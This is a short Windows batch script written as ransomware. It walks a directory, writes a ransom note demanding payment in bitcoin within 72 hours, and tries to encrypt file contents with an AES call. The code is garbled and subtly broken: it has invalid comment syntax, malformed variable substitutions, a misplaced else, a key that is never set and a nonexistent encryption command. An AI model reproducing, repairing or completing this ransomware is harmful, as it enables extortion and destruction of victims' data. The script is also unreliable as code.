@echo off
setlocal enabledelayedexpansion
set "path=%CD%"
set "file=%n0"  // current file name (without extension)
for /f "delims=" %%a in ('dir /b /ad "%path%*"') do (   set "full=%%a" & set "ext=!full:-4!" & set "name=!full:~0,-4!" & if exist "%path%%name%.encrypted" goto skipit) else goto skipit   echo Attention! Your files have been encrypted. To get your files back, please pay the ransom of $X dollars ($Y in bitcoin) within 72 hours. > "%path%%file%.txt"   echo Encryption key: %encryptionKey% >> "%path%%file%.txt"   echo File name without extension: %name% >> "%path%%file%.txt"    rem Encrypt file contents using encryption key    for /f %%i in ('type "%full%" ^| findstr "^[^-]"') do (set line=%%i&call :encryptLine !line!) )     :encryptLine  enc -aes256 -cbc -k !encryptionKey! !line! > nul && del /q ".\temp\%%i.tmp">>nul || del /q ".\temp\%%i.tmp">>nul
